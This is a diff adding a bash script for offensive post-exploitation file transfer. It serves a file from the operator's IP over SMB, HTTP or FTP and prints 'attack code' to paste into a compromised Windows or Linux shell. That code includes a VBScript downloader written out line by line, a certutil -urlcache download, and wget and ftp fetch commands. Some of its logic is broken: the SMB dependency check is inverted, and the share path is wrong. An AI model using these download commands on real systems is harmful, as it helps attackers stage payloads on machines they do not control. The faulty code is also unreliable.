@@ -1,0 +1,179 @@
+#!/bin/bash
+
+function print_usage() {
+   echo "USAGE:"
+   echo "     $0 [OPTION]... <FILE> "
+   echo ""
+   echo "EXAMPLE:"
+   echo "     $0 -w 10000 ... /tmp/myfile"
+   echo "     Serve \"myfile\" via http on port 10000."
+   echo ""
+   echo "DESCRIPTION:"
+   echo "     Serve files to a target host through several protocols. Generates"
+   echo "     Bash and Bat scripts to paste directly on a remote attack shell."
+   echo ""
+   echo "     NOTE: Most of the tools expose the uploaded file's entire folder"
+   echo "     Make sure to remove any sensitive information stored in it."
+   echo ""
+   echo "     Only one of -s, -w and -f might be chosen each time."
+   echo ""
+   echo "     -i, --ip <IP>"
+   echo "            specify your IP (defaults to first \"ip addr\" result)"
+   echo ""
+   echo "     -s, --smb"
+   echo "            serve file through the smb service (port 445)"
+   echo "            dependencies: impacket-smbserver"
+   echo ""
+   echo "     -w, --web <LPORT>"
+   echo "            serve file through http on a specified port"
+   echo "            dependencies: python \"SimpleHTTPServer\" module"
+   echo ""
+   echo "     -f, --ftp <LPORT>"
+   echo "            serve file through ftp on a specified port"
+   echo "            dependencies: python \"pyftpdlib\" module"
+}
+
+function smb_option() {
+   which impacket-smbserver > /dev/null 2>&1 
+   [[ $? -gt 0 ]] || {
+      echo "The -s (--smb) option requires impacket-smbserver in your PATH"
+      echo "    * https://github.com/SecureAuthCorp/impacket"
+      exit 1
+   }
+   SMB=1
+}
+
+function ip_option() {
+   IP=$1
+}
+
+function web_option() {
+   PORT="$1"
+   python -c "import SimpleHTTPServer" 2>/dev/null
+   [[ $? -eq 0 ]] || {
+      echo "The -w (--web) option requires python module \"SimpleHTTPServer\""
+      exit 1
+   }
+   WEB=1
+}
+
+function ftp_option() {
+   PORT="$1"
+   python -c "import pyftpdlib" 2>/dev/null
+   [[ $? -eq 0 ]] || {
+      echo "The -f (--ftp) option requires python module \"pyftpdlib\""
+      exit 1
+   }
+   FTP=1
+}
+
+IP=$(ip addr | grep 'UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
+while [[ -n "$1" ]]; do
+   case "$1" in
+   -i | --ip) ip_option $2; shift ;;
+   -s | --smb) smb_option ;;
+   -w | --web) web_option $2; shift ;;
+   -f | --ftp) ftp_option $2; shift ;;
+   *) FILE=$1 ;;
+   esac
+   shift
+done
+
+if [[ -z $FILE ]] || [[ ! -f $FILE ]]; then
+   print_usage
+   exit 1
+fi
+
+if [[ -z $IP ]]; then
+   echo "IP could not be automatically determined."
+   echo "    * Use the -i <IP> option to specify it manually."
+fi
+
+if [[ $SMB ]]; then
+   echo "=========== MSDOS ATTACK CODE =========== "
+   echo "copy \\\\${IP}\\c0up\\${FILE} ${FILE}"
+   echo "========================================= "
+   echo ""
+   echo " Copy the attack code above to your target shell, then terminate this "
+   echo " script with CTRL-C to shut down the SMB server. "
+   echo ""
+   echo " Starting smbserver instance... "
+   echo " * impacket-smbserver c0up $(basename ${FILE})"
+   impacket-smbserver c0up $(basename ${FILE}) > /dev/null
+   exit 
+fi
+
+if [[ $WEB ]]; then
+   echo "=========== MSDOS ATTACK CODE (wget version) =========== "
+   echo "echo strUrl = WScript.Arguments.Item(0) > wget.vbs"
+   echo "echo StrFile = WScript.Arguments.Item(1) >> wget.vbs"
+   echo "echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs"
+   echo "echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs"
+   echo "echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs"
+   echo "echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs"
+   echo "echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs"
+   echo "echo Err.Clear >> wget.vbs"
+   echo "echo Set http = Nothing >> wget.vbs"
+   echo "echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs"
+   echo "echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs"
+   echo "echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs"
+   echo "echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs"
+   echo "echo http.Open \"GET\", strURL, False >> wget.vbs"
+   echo "echo http.Send >> wget.vbs"
+   echo "echo varByteArray = http.ResponseBody >> wget.vbs"
+   echo "echo Set http = Nothing >> wget.vbs"
+   echo "echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs"
+   echo "echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs"
+   echo "echo strData = \"\" >> wget.vbs"
+   echo "echo strBuffer = \"\" >> wget.vbs"
+   echo "echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs"
+   echo "echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs"
+   echo "echo Next >> wget.vbs"
+   echo "echo ts.Close >> wget.vbs"
+   echo "cscript wget.vbs http://${IP}:${PORT}/${FILE} ${FILE}"
+   echo "del wget.vbs"
+   echo "======================================================== "
+   echo ""
+   echo "========= MSDOS ATTACK CODE (certutil version) ========= "
+   echo "certutil.exe -urlcache -split -f http://${IP}:${PORT}/${FILE} ${FILE}"
+   echo "======================================================== "
+   echo ""
+   echo "=========== BASH ATTACK CODE ============ "
+   echo "wget http://${IP}:${PORT}/${FILE}"
+   echo "========================================= "
+   echo ""
+   echo " Copy the attack code above to your target shell, then terminate this "
+   echo " script with CTRL-C to shut down the web server. "
+   echo ""
+   echo " Starting python web server instance... "
+   echo " * python -m SimpleHTTPServer ${PORT} $(dirname ${FILE})"
+   python -m SimpleHTTPServer ${PORT} $(dirname ${FILE}) > /dev/null
+   exit 
+fi
+
+if [[ $FTP ]]; then
+   echo "=========== MSDOS ATTACK CODE =========== "
+   echo "echo open ${IP} ${PORT} > ftp.txt"
+   echo "echo USER iftp iftp>> ftp.txt"
+   echo "echo quote pasv>> ftp.txt"
+   echo "echo binary >> ftp.txt"
+   echo "echo GET ${FILE} >> ftp.txt"
+   echo "echo bye >> ftp.txt"
+   echo "ftp -v -n -s:ftp.txt"
+   echo "======================================================== "
+   echo ""
+   echo "=========== BASH ATTACK CODE ============ "
+   echo "$ wget --user=iftp --password iftp ftp://${IP}:${PORT}/${FILE}"
+   echo "========================================= "
+   echo ""
+   echo " Copy the attack code above to your target shell, then terminate this "
+   echo " script with CTRL-C to shut down the web server. "
+   echo ""
+   echo " Starting python ftp server instance... "
+   echo " * python -m pyftpdlib --port=${PORT} -u iftp -P iftp -D"
+   python -m pyftpdlib --port=${PORT} -u iftp -P iftp -D > /dev/null
+   exit 
+fi
+
+print_usage
+exit 1
